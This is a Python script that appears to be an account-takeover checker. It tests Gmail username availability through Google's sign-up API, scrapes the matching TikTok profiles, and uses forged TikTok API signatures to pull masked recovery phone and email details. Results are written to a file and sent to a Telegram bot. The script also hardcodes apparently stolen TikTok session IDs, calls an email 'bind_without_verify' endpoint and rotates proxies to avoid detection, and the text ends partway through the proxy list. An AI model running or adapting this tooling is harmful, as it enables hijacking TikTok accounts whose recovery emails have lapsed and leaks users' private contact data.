import os
try:
	import time
	import secrets
	import binascii
	import random
	import re
	import json
	from urllib.parse import urlencode
	from concurrent.futures import ThreadPoolExecutor
	import datetime
	import sys
	import requests
	from user_agent import generate_user_agent as nn
	from MedoSigner import Argus, Gorgon, md5, Ladon
	from types import coroutine
	import uuid,threading

except:
    os.system("pip install requests")
    os.system("pip install uuid")
    os.system("pip install user_agent")
    os.system("pip install MedoSigner")
    os.system("pip install pycryptodome")




class S1:
    def __init__(self):
        self.hit = 0
        self.f = 0
        
        self.num=0
        os.system('clear')
        print(f"""
✦ 𝗕𝘆 ➤  Ali Bssam     
━━━━━━━━━━━━━━━━━━━━
3 ✦ Get List 
━━━━━━━━━━━━━━━━━━━━""")
        zs=input('Enter Choice ? ')
        if zs=='qjvsjs':
        	os.system('clear')
        	for _ in range(5):
        		threading.Thread(target=self.ser).start()
        elif zs=='whvdid':

        	for _ in range(5):
        		threading.Thread(target=self.check).start()
        elif zs=='1':
        	os.system('clear')
        	for _ in range(100):
        		threading.Thread(target=self.get).start()
        else:
        	sys.exit()
        	
        	

        self.t = 0
        self.tf = 0
        self.sessions=['c4fa59b59ece70395023afe78baa5d8a', '36144c9f68b6eb8aefb501a6a31e8118', 'ccbe4b0c894f0d4c1e5c679f07287b3b', 'cb74967182ec687b9fc0435bc4fcae89', '21953b31d25e7b508e8c64c24f48a108', '1b3360c5cec4c44457b8813cb9536e45', '3df46a118be3401707d30327a8858d74', '900b6e7958a805f3113f317b938c1ebb', 'a147960a734ce913251d91e75bd41de2', '263610f531b715adfb34d26567e9b6f3', 'b6fde9cea09ad4be89b9121b7f1a7a04', '9edada27bfcec7e8a1ff649beea19c76', 'd64af91724d38f7bc73b3fef0fca8db9', '20b2f37bbcf5595b9d3a513df868f10a', '73a38762633252801cc48c7ce96b126a', '8ded08b5a2f7c138f82ef19bff62b014', '08fb9b8270b8885efcd6348821a3b595', '01a268b5490b71262326329776e67e42', 'bcbe07458dd7cb6bcf41da270fc7eec8', '9c3901e64f0920e9f0efd8dcbb09c9af', '1a4bdfb7776f6734298f4c9075d2a418', '0138e069e8fe6c8b07e1a0db9038a332', '2d9940d16376dee30d53112f55a15136', 'aafcba353ff35b0031746c72682aaca2', '9dea2180a9e6edf163a18f9f0420496c', 'ab10d6d6780a0d48de5bd51f16009b4d8', '87e11bed392b70782e58dec0370d8447', '1d3f912a6800fbdf69a3fc383ce5ee58', '93d69013bc71583716e497c7fc17ca27', 'f250acc8b1e5d5f92ee8be3699fd6536', 'b2aecd030b057c45366dad00cefecd7d', '4b4c3c47cbdd5bd38202403125091a51', '9e71174495cc2c9ff6674b29233305ff', 'f9044bb2a34f86a45b45171e0a92ef6d', 'cac437b128dbe68afbd33d0e80e56483', '36a704a0ee788e83c547efd31eea3846', '0e3dd0aca3cab9de1edd01492d849ac5', '632b6cab67509bbfe17c0db9e49617d8', '0064350770d0ccca2ab54a379b8ba9bf', 'b25614823870dcfcba6fdef6e72af5d1', '29e5a771a6b47b114b75af600e290edd', 'e410b62db135a6e953714b2405808e97', 'fca9734feeec2910a19ef9dd57d8426a', '7298c225f1bb7025e2c74b3146e8e497', '7772b65eaf8af91e68b40b6faed360cb', 'b51f36b2cefac35c1847bb1631113588', 'a376eb74de92c39e43114c740490477d', 'f466e8e3e2f43915db01ae6efbcf5e7b', '32ace4984ce8e910fdb958cf55f01c40', '5325618720103e7987ac8e1eb7777f79', 'c563af7e7ffd63bf083e1f18d78dfb0d', '44f37d99726fc9895b947db8e822469f', 'eeb95e2378303763df06c3a40a5f3a95', '30f8ff14e3d5c84f881f58d50c59105', 'c3058b76be0aba378b47697c535eb916', 'c7bf9f67464ca6ad4d7027dbd1a39b27', '140f6b043b7965b4593d31bc74b720d4']
        self.ses=requests.Session()
        self.abc='azertyuiopmlkjhgfdsqwxcvbn'
        self.name =''.join(random.choice(self.abc) for i in range(random.randrange(5,10)))
        self.birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
                
    def rest(self, email):
      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
          }        
      try:
            secret = secrets.token_hex(16)
            session = requests.Session()
            session.cookies.update({
                "passport_csrf_token": secret,
                "passport_csrf_token_default": secret
            })

            url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
            device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
            device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
            regions = ["AE", "IQ", "US", "FR", "DE"]
            languages = ["ar", "en", "fr", "de"]
            params = {
                'request_tag_from': "h5",
                'fixed_mix_mode': "1",
                'mix_mode': "1",
                'account_param': email,
                'scene': "5",
                'device_platform': "android",
                'os': "android",
                'ssmix': "a",
                '_rticket': str(round(time.time() * 1000)),
                'cdid': str(uuid.uuid4()),
                'channel': "googleplay",
                'aid': "1233",
                'app_name': "musical_ly",
                'version_code': "370104",
                'version_name': "37.1.4",
                'manifest_version_code': "2023701040",
                'update_version_code': "2023701040",
                'ab_version': "37.1.4",
                'resolution': "720*1448",
                'dpi': str(random.choice([420, 480, 532])),
                'device_type': random.choice(device_types),
                'device_brand': random.choice(device_brands),
                'language': random.choice(languages),
                'os_api': str(random.randint(28, 34)),
                'os_version': str(random.randint(10, 14)),
                'ac': "wifi",
                'is_pad': "0",
                'current_region': random.choice(regions),
                'app_type': "normal",
                'sys_region': random.choice(regions),
                'last_install_time': str(random.randint(1600000000, 1700000000)),
                'mcc_mnc': "41840",
                'timezone_name': "Asia/Baghdad",
                'carrier_region_v2': "418",
                'residence': random.choice(regions),
                'app_language': random.choice(languages),
                'carrier_region': random.choice(regions),
                'timezone_offset': str(random.randint(0, 14400)),
                'host_abi': "arm64-v8a",
                'locale': random.choice(languages),
                'ac2': "wifi",
                'uoo': "0",
                'op_region': random.choice(regions),
                'build_number': "37.1.4",
                'region': random.choice(regions),
                'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
                'iid': str(random.randint(1, 10**19)),
                'device_id': str(random.randint(1, 10**19)),
                'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
                'support_webview': "1",
                'reg_store_region': random.choice(regions).lower(),
                'user_selected_region': "0",
                'cronet_version': "f6248591_2024-09-11",
                'ttnet_version': "4.2.195.9-tiktok",
                'use_store_region_cookie': "1"
            }
            app_name = "com.zhiliaoapp.musically"
            app_version = f"{random.randint(2000000000, 3000000000)}"
            platform_str = "Linux"
            os_version = f"Android {random.randint(10, 15)}"
            locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
            locale = random.choice(locales)
            dev_type = random.choice(["phone", "tablet", "tv"])
            build = f"UP1A.{random.randint(200000000, 300000000)}"
            cronet_version = f"{random.randint(10000000, 20000000)}"
            cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
            quic_version = f"{random.randint(10000000, 20000000)}"
            quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
            user_agent = (f"{app_name}/{app_version} ({platform_str}; U; {os_version}; {locale}; {dev_type}; "
                          f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                          f"QuicVersion:{quic_version} {quic_date})")
            x_args = sign(params=urlencode(params), payload="", cookie="")
            headers = {
                'User-Agent': user_agent,
                'Accept': "application/json, text/plain, */*",
                'x-tt-passport-csrf-token': secret,
                'content-type': "application/x-www-form-urlencoded",
                'x-argus': x_args.get("x-argus", ""),
                'x-gorgon': x_args.get("x-gorgon", ""),
                'x-khronos': x_args.get("x-khronos", ""),
                'x-ladon': x_args.get("x-ladon", "")
            }
            response = session.post(url, params=params, headers=headers)
            response.raise_for_status()
            passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
            login_url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
            params.update({"passport_ticket": passport_ticket})
            for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
                params.pop(key, None)
            response = session.post(login_url, params=params, headers=headers)
            response.raise_for_status()
            hh = json.loads(response.headers.get("x-tt-verify-idv-decision-conf", "{}"))
            result = {'number': '', 'email': ''}
            for entry in hh.get('extra', []):
                masked = entry.get('masked_account', '')
                if '+' in masked:
                    result['number'] = masked
                elif '@' in masked:
                    result['email'] = masked
            return result
      except Exception as e:

            return {'number': '', 'email': ''}

    def info(self, email):
        user = email.split('@')[0]
        try:
        	headers = {'user-agent': str(nn())}
        	r= requests.get(f'https://www.tiktok.com/@{user}',  headers=headers).text
        	info = str(r.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        	country = str(info.split('region":"')[1]).split('",')[0]
        	lik= str(info.split('heart":')[1]).split(',"')[0]
        	name = str(info.split('nickname":"')[1]).split('",')[0]
        	folos= str(info.split('followerCount":')[1]).split(',"')[0]
        	folon= str(info.split('followingCount":')[1]).split(',"')[0]
        	vid= str(info.split('videoCount":')[1]).split(',"')[0]
        	user_id = str(info.split('id":"')[1]).split('",')[0]
        	private = str(info.split('privateAccount":')[1]).split(',"')[0]
        	sv=str(info.split('secUid":')[1]).split(',"')[0]
        	bio=str(info.split('signature":')[1]).split(',"')[0]

        	rest_result = self.rest(email)

        	ff = f"""
𝗛𝗜𝗧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗧𝗜𝗞𝗧𝗢𝗞        	
━━━━━━━━━━━━━━━━━━━━
✦ 𝗕𝘆 ➤  @jokerpython3		
━━━━━━━━━━━━━━━━━━━━
✦ 𝗛𝗜𝗧 ➤ {self.hit}
✦ 𝗥𝗘𝗦𝗘𝗧 ➤ {rest_result}
✦ 𝗡𝗔𝗠𝗘 ➤ {name}
✦ 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 ➤  {user}
✦ 𝗚𝗠𝗔𝗜𝗟 ➤ {user}@gmail.com
✦ 𝘀𝗲𝗰𝗨𝗶𝗱 ➤ {sv}
✦ 𝗜𝗗 ➤ {user_id}
✦ 𝗩𝗜𝗗𝗘𝗢 ➤  {vid}
✦ 𝗕𝗜𝗢 ➤ {bio}
✦ 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 ➤ {folos}
✦ 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 ➤ {folon}
✦ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➤ {country}
✦ 𝗟𝗜𝗞𝗘 ➤ {lik}		
━━━━━━━━━━━━━━━━━━━━"""
        	print(ff)
        	with open('Hit.txt','a') as tu:
        		tu.write(ff+'\n')
        	requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + ff)
        except Exception as e:
 

            ff = f"""
𝗛𝗜𝗧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗧𝗜𝗞𝗧𝗢𝗞            
━━━━━━━━━━━━━━━━━━━━
✦ 𝗕𝘆 ➤ @jokerpython3		
━━━━━━━━━━━━━━━━━━━━
✦ 𝗛𝗜𝗧 ➤ {self.hit}
✦ 𝗥𝗘𝗦𝗘𝗧 ➤ {self.rest(email)}
✦ 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 ➤ {user}
✦ 𝗚𝗠𝗔𝗜𝗟 ➤ {user}@gmail.com
━━━━━━━━━━━━━━━━━━━━"""
 
            with open('Hit.txt','a') as tu:
            	tu.write(ff+'\n')
            requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + ff+e)

    def ch1(self,email):
        headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://accounts.google.com/',


        'upgrade-insecure-requests': '1',
        'user-agent': str(nn()),
        'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
        'x-client-data': 'CKb7ygE=',
}
        params = {
    'biz': 'false',
    'continue': 'https://www.google.com/search?q=odiid&oq=odiid&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBBzUzOGowjGoAgCwAgA&sourceid=chrome-mobile&ie=UTF-8',
    'ec': 'GAlAAQ',
    'flowEntry': 'SignUp',
    'flowName': 'GlifWebSignIn',
    'hl': 'ar',
    'authuser':'0',



}
        response = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        TL = response.url.split('TL=')[1]

        at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')

        s1 = str(response.text).split('"Qzxixc":"')[1].split('"')[0]
        hename={
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',

            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',

            'user-agent': str(nn()),

            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params = {
    'rpcids': 'E815hb',
    'source-path': '/lifecycle/steps/signup/name',

    'hl': 'ar',
    'TL': TL,

    'rt': 'c',
}
        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name,at)
        rename=self.ses.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,

    headers=hename,
    data=data,
).text

        hebir={
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',

            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',

            'user-agent': str(nn()),

            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }
        params = {
    'rpcids': 'eOY7Bb',
    'source-path': '/lifecycle/steps/signup/birthdaygender',

    'hl': 'ar',
    'TL':TL,

    'rt': 'c',
}

        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CoW1qbTUCAAYBzfNKIc2NqatmouWwTSP0ADQBEArZ1I8Ch94lfpYfrmnrKHwxJnKWaKN7vmaPg1nZckhu9cYTqaaLl9zl8ICQiMB8gh4rzQAABFmdAAAAJKcBB7EATQJA4FY8cFsp8MFfaz9q6AFO6Kzn-UhxhRTzfpl6KopMZy7G5tgtsVkZP4YbDJNN7rRAJVymInyeE5vDep-2fJKhZpjLnIOO6vaqoMXVVgi20M5Hqs8IpKTOnpX_Yucia2MQu9wzUcQ4rGkBbHbNiXEbB_QSLbcN23KbhIEZLn2OKMQyIOGkthlWltTHbzk3qiZNVE7gTSFhzJHD-S0lhNKktIsSNwBWGOnSbWF0PskCKIWdcKVqR0aHRR5AmXY8ltz408DI3GBrI11_AVadMRaXzD7K7bgJIInK4UhXDlOUY2GOS0dt0A_ZcwNJsZy61_7ATmWbi5O8FZ-pCgBsfEiVjTbMeTeVKQ-AgYLnFF1Ii0WH_Y-JpJpGVT5BsziPX-bMUFVdVa4eMcCGcorkwMkvgmfQolD3guqTAQdihtw0VbBHNFxlkmHuNa1zQHZVvh0efFlfhnrX8YHceq_mh5zVS4O3eUAExyabrFQW2NJDvr0VfFHN0c64C3JAgAuC2JujAim7IV9t3oHNvquEQE1yWYQzyS8Co54nc_CbPcMF5iHN7cZiiUXFLvjdNedJzZ9IHESmt6acC4W4ralK6NbSg4qk3HXsKQe9J1bvQ0pFzlZK8q0EEXPFINP7xioq6V0jeGU9qGmdktBdMWIanTDzu6kIecW5sQEMYx8Bo86G8j8d88xb3DVzeTtjTpOJ1TDAvoMfj0iKP6PBDA2dw1ta4LQPZWJFUwP1_BIl6SjXNDlbCcENDiIvH9H0hvS1l7EhbvJqo9iducM8cnr0z47rVEcmNW1JriRaa2QnjqN6cMD8gLqroivmX2LTSl6iTdhL4YZMKTDbL7nAAuGbhxj2IqyeNwlHeO62KWxrAYtBKMq2-bNBsWns1ZMo9zrrYM4if30mVaSeEoPzkkfq28OuvH35JbT9RzTAO4Tb_HI7l-5AvA-Du5I-dVfBmCUcXek_2R4CUcIkQJkh1V5x6o4kLDjymG3YkUDzuMVeGFUlL8C8zPVmya1WV5FKbV_2XjfKCvNKoqMXGrIezTIoKJ_0_PwNGRkIcAckLkhKyzHiAOxSSYTV7_9GwWI3kct2ifRjGs5MRCfK0FgdafCQuDtmr_njqS0wj4qqLW_2PfKyHKCLaMTZMMShcXMG4X0_5898av9tI4HXYb8OAegshjnS42GJ41_vLNDmb_HS_lEEUPT2pmujipjE4rLCyooQHLI_XR9B6yb9gkB0Co44fGqDXPBxr6LyVyZlnGbEicqbpERhIFG_9GjsjQVZfquJuNQ_ds7w6G3YL4XLxmjsWWkipQXmLRF-E8YimF9M1OUNKzqUeq149TCEMLLDDRrF4-k7866Xy1L7xjDjE-3QS-nGzHbK8wOgIu3v-4fldiumMm26FJRuk9WuTeYG7xXeQSyg0p0oYrDq2KlH4YAwUZL7d6z8-mN22IFpaK6H9wGLZzcBTaHtkrSfyLLEv3aRgvg2p1zyzmu1Ybkw3OwBJyBZgHCmrVim3f_Cvxn4w2deq-9YA0ok_x3_nzrEi8khS4RM6enmJLFc2yLWTk3Dmb4He2cyyjaOoypcTywMXp9ZBd01vUB6QaQ4THa2uS3C5N5yiyJBermtbU17daoFg8OJHKiGiEq59_WnPoTXa2c-WOrEmT27GCn2aFt4UPWUHID6ZqUd9iMGaz6NhFtVp-qFyUY8ejpyaqgaMYD9jguM0NlgauZv6LloS54HtLoqgEMTGiQDwfqFvcbTcFmf_O2LPKYvNOj4fUAkBbth8MzHBUhDQEMjm-9noSQGq8LG3cJN5L9a2rhC36zsYo2Uo3jexXOfgZOBHHOfxSbWKgSVGL9dEvEHwsyf2sSJxUIcAAp6ECVaWqEY1pdaaNLefKJ2DO-AYj4E31aN3ftlP0UF_0ydLl7EMDxYSDp8xNq2KCjAC9Q6vBf6o4rBRZwKSXYKwluyNDT_ZhDowhq-tHMDSxB4eDbaFnA1q6B2vvAKNYJU3heQ4KRwrKZ6fUwUfyymQ2wjdeVXDOCiNk56dSvJNVEMToNlcCTHInl9XG1QfZusRflcibYKYnrtqklEZVEpv74y5h2JypKKiXsRo_bQj-UBnSFWKY4U50EzDLRyNRlrP5B68WpV5aSAwxzMR_wsIaHhAWQNorE1n5FIOuSD0I0laAmSw7KbESwYfebw9MPTdGXZH7o9wMnJzFKOUG0h1XVMD-loA-X99dkqMAK1oMUFXIo3J2cLm8AjA116lFdfrIJ8zBrOxXO188nowci8AbJRrcJzgkC29t5e3_Q5xRXknPdrOO-W7tSySsgdRlLVQLP4Sw_ChmlPGTpGG9FzCAqpMowBi8sjjXdZGL0jVQ5KOTZT0XsfF1LBe6EwvoFfjB1LArKqmXKykG6UbFW0F6s692TvkhmEzeK2HL9seyZ8L8THugqYmKHywBdVzvdRGri8blQUk1tWQG9imNMkfE7qcvZtViMJbe1-b94ZIwbnEv4iGd1oYEqL4F5xzMPg_LOftp8paGHq0XhSCibleGbdTw-Hf-NEXTDZE4TWV1UHpKCksoqgTtZs0wd11awf8qAruyPf4pf8VQgU1phyDzHEQbXlMwU3K4iCgCd4w-FuhisNwrW-5wdGl1WrH_Qw6VAvOkoAYPkgjKq_NiKknSW2WrsJtzPsq2Y_OrNM4rdxvrhveZGztQIn6QgBZBym4kfgNkmOmym7KibdZBCqHs8wqrRv9LYG9AowtvBhyWlGTf6OLvRO66Nct8rkdHYBIubxKRVIyAx2LtUwHKtsheX32-MGDyTuD0C1Evh3yeWN5RQGfw2hUyZq9U0mUbLn_LJX_w6fxRBDk6-FjsLTfgFV-listZpVbw4eyJt2KJDSAynICBlmF4vXu-VY9gWgmq4oFPHZfQP9HN5Cegn9R8aK353Y2pKGhDUcDRhLfwMHOAVzGbnjzgMwfsMeK40tgBDE2PkwuuACp_FuJy3EDEJf5pfiA38O0CuLz2AiXeRztWEkuCVNcwTH7QMRsJcI28SuZNwl0uQx2_yNboa4zWb-DSv3CfEr9AKSU7Fy0pVmjzMEBzbiHib2tuw0HzX9dE03Tg%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dodiid%26oq%3Dodiid%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzUzOGowjGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8%5C%22%5D%5D%5D&at={}&'.format(self.birthday[0],self.birthday[1],self.birthday[2],at)
        fr = self.ses.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,

    headers=hebir,
    data=data,
        ).text

        hech={
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',

            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',

            'user-agent': str(nn()),

            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["'+s1+'"]',
            'x-same-domain': '1',
        }

        params = {
    'rpcids': 'NHJMOd',
    'source-path': '/lifecycle/steps/signup/username',

    'hl': 'ar',
    'TL':TL,
    'rt': 'c',
}
        if '@' in email:
        	em=email.split('@')[0]
        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C13922%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(em,at)
        rse =self.ses.post(
    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
    params=params,

    headers=hech,
    data=data,
).text


        if "password" in rse:
            self.info(email)
            self.hit+=1

            sys.stdout.write(f'''\rHit: {self.hit} Bad TikTok: {self.f} Bad gmail: {self.tf}\r''')
        else:
        	self.tf+=1

        	sys.stdout.write(f'''\rHit: {self.hit} Bad TikTok: {self.f} Bad gmail: {self.tf}\r''')






    def ch2(self,email):
      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version_str=sdk_version_str, sdk_version_int=sdk_version)
          }
        
      session = requests.Session()
      secret = secrets.token_hex(16)
      stw=random.choice(self.sessions)
      cookies = {
        "passport_csrf_token": secret,
        "passport_csrf_token_default": secret,
        "sessionid":stw,
    }
      session.cookies.update(cookies)
      device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
      device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
      regions = ["AE", "IQ", "US", "FR", "DE"]
      languages = ["ar", "en", "fr", "de"]
      params = {
        'passport-sdk-version': "6031490",
        'device_platform': "android",
        'os': "android",
        'ssmix': "a",
        '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'cdid': str(uuid.uuid4()),
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "370104",
        'version_name': "37.8.5",
        'manifest_version_code': "2023701040",
        'update_version_code': "2023701040",
        'ab_version': "37.8.5",
        'resolution': "720*1448",
        'dpi': str(random.choice([420, 480, 532])),
        'device_type': random.choice(device_types),
        'device_brand': random.choice(device_brands),
        'language': random.choice(languages),
        'os_api': str(random.randint(28, 34)),
        'os_version': str(random.randint(10, 14)),
        'ac': "wifi",
        'is_pad': "0",
        'current_region': random.choice(regions),
        'app_type': "normal",
        'sys_region': random.choice(regions),
        'last_install_time': str(random.randint(1600000000, 1700000000)),
        'mcc_mnc': "41840",
        'timezone_name': "Asia/Baghdad",
        'carrier_region_v2': "418",
        'residence': random.choice(regions),
        'app_language': random.choice(languages),
        'carrier_region': random.choice(regions),
        'timezone_offset': str(random.randint(0, 14400)),
        'host_abi': "arm64-v8a",
        'locale': random.choice(languages),
        'ac2': "wifi",
        'uoo': "0",
        'op_region': random.choice(regions),
        'build_number': "37.8.5",
        'region': random.choice(regions),
        'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
        'support_webview': "1",
        'reg_store_region': random.choice(regions).lower(),
        'user_selected_region': "0",
        'cronet_version': "f6248591_2024-09-11",
        'ttnet_version': "4.2.195.9-tiktok",
        'use_store_region_cookie': "1"
    }
 
           
      payload ={'email': email}

      app_name = "com.zhiliaoapp.musically"
      app_version = f"{random.randint(2000000000, 3000000000)}"
      platform = "Linux"
      os_version = f"Android {random.randint(10, 15)}"
      locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
      locale = random.choice(locales)
      device_type = random.choice(["phone", "tablet", "tv"])
      build = f"UP1A.{random.randint(200000000, 300000000)}"
      cronet_version = f"{random.randint(10000000, 20000000)}"
      cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
      quic_version = f"{random.randint(10000000, 20000000)}"
      quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
      user_agent = (f"{app_name}/{app_version} ({platform}; U; {os_version}; {locale}; {device_type}; "
                  f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                  f"QuicVersion:{quic_version} {quic_date})")
      x_args = sign(params=urlencode(params), payload="", cookie="")
      headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': secret,
        'x-argus': x_args["x-argus"],
        'x-gorgon': x_args["x-gorgon"],
        'x-khronos': x_args["x-khronos"],
        'x-ladon': x_args["x-ladon"],
    }
      url ="https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
      wsz=['61.19.42.140:80', '15.156.24.206:3128', '8.211.42.167:80', '135.181.154.225:80', '63.35.64.177:3128', '13.56.192.187:80', '8.213.222.157:8080', '8.210.232.181:7888', '20.13.148.109:8080', '203.19.38.114:1080', '8.211.51.115:9098', '13.37.73.214:80', '37.187.25.85:80', '35.76.62.196:80', '99.80.11.54:3128', '43.201.121.81:80', '13.36.104.85:80', '15.156.24.206:3128', '8.211.42.167:80', '135.181.154.225:80', '63.35.64.177:3128', '13.56.192.187:80', '8.210.232.181:7888', '203.19.38.114:1080', '8.211.51.115:9098', '13.37.73.214:80', '18.228.198.164:80', '67.43.228.250:30759', '3.97.176.251:3128', '13.36.113.81:3128', '3.212.148.199:3128', '47.252.50.153:3128', '8.213.156.191:80', '13.246.184.110:3128', '61.19.42.140:80', '15.156.24.206:3128', '8.211.42.167:80', '135.181.154.225:80', '63.35.64.177:3128', '13.56.192.187:80', '47.91.110.148:8080', '47.56.110.204:8989', '8.210.232.181:7888', '203.19.38.114:1080', '20.13.148.109:8080', '8.211.51.115:9098', '13.37.73.214:80', '103.152.112.186:80', '103.152.112.195:80', '3.139.242.184:80', '204.236.137.68:80', '16.16.239.39:3128', '123.30.154.171:7777', '13.36.87.105:3128', '13.246.184.110:3128', '51.16.179.113:1080', '52.63.129.110:3128', '51.20.19.159:3128', '51.17.58.162:3128', '51.20.50.149:3128', '62.210.15.199:80', '13.246.209.48:1080', '219.65.73.81:80', '51.16.179.113:1080', '8.220.205.172:8081', '8.220.205.172:1080', '13.36.104.85:80', '13.36.87.105:3128', '44.218.183.55:80', '3.71.239.218:3128', '52.67.10.183:80', '47.250.51.110:5007', '67.43.228.250:14827', '152.230.215.123:80', '3.139.242.184:80', '72.10.160.92:27993', '43.202.154.212:80', '52.16.232.164:3128', '8.221.138.111:8443', '13.246.209.48:1080', '3.122.84.99:3128', '47.237.92.86:8080', '103.152.112.186:80', '77.242.177.57:3128', '52.67.10.183:80', '47.250.51.110:5007', '67.43.228.250:14827', '44.195.247.145:80', '47.89.159.212:93', '15.236.106.236:3128', '81.169.213.169:8888', '13.36.113.81:3128', '13.36.87.105:3128', '3.129.184.210:80', '142.44.210.174:80', '3.141.217.225:80', '77.242.177.57:3128', '52.67.10.183:80', '200.174.198.86:8888', '47.250.51.110:5007', '67.43.228.250:14827', '125.25.32.206:8080', '54.248.238.110:80', '3.126.147.182:80', '54.228.164.102:3128', '3.141.217.225:80', '45.140.143.77:18080', '52.67.10.183:80', 